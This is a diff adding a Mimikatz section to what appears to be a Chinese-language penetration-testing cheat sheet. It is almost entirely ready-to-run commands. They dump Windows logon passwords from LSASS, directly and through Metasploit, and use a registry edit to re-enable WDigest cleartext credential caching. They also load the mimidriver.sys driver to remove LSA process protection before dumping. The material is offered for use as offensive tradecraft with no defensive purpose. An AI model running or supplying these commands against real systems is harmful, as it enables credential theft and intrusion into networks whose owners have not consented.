@@ -302,6 +302,49 @@ qwertyui
 casper
 ```
 
+## Mimikatz
+
+一条命令
+```
+.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
+```
+控制台执行多条命令，用log防止进程崩溃，数据丢失
+```
+mimikatz # privilege::debug
+mimikatz # log
+mimikatz # sekurlsa::logonpasswords
+mimikatz # sekurlsa::wdigest
+```
+msf中执行命令
+```
+mimikatz_command -f sekurlsa::logonPasswords full
+mimikatz_command -f sekurlsa::wdigest
+```
+注册表开启wdigest,08r2后默认关闭。需要目标注销，重新登录。2016需要重启。
+```
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /f /d 1
+```
+### bypass lsa Protection(ppl)
+查询是否启用
+```
+reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+
+```
+把mimidriver.sys拷贝到同级目录，进行加载bypass
+```
+mimikatz # !+
+mimikatz # !processprotect /process:lsass.exe /remove
+mimikatz # privilege::debug    
+mimikatz # token::elevate
+mimikatz # sekurlsa::logonpasswords
+mimikatz # !processprotect /process:lsass.exe
+mimikatz # !-
+```
+
+
+
+
+
 ## cs凭证解析
 
 提取用户名
